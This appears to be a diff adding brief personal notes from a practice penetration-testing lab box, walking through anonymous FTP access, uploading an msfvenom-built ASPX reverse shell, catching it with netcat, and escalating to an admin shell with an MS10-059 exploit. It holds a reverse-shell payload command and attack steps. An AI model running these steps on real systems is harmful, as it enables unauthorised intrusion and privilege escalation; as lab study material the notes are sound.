@@ -1,0 +1,20 @@
+1. Nmap results shows - target allows FTP with anonymous login
+2. We login into FTP using "anonymous" username and password - anything
+3. ls to check all the files
+4. In browser --> 10.10.10.5/file.txt --> gives output text
+5. Use msfvenom command 
+msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.x.x LPORT=4444 > shell-rev.aspx
+6. Transfer file to target using FTP command "put shell-rev.aspx"
+7. Listen to Netcat and execute /shell-rev.aspx in browser, we got low priv shell
+8. Execute Systeminfo command, copy output to .txt file in kali
+9. Use windows-exploit-suggester, we have found ms10-059 => Chimichurri.exe
+10. As we have using it in one of the previous boxs, we have this exploit
+in handy
+11. In low priv shell, cd to Users/Public/Downloads> 
+12. Transfer file to downloads. execute >Chimicurri.exe <ip> <port>
+13. Listen with another netcat session => got adminshell
+
+Note:
+1. Refer file transfer cheatsheet
+2. Refer to msfvenom commands
+3. Refer to Rana-Khalail gitbook and IPPSEC videos for other ways for thos
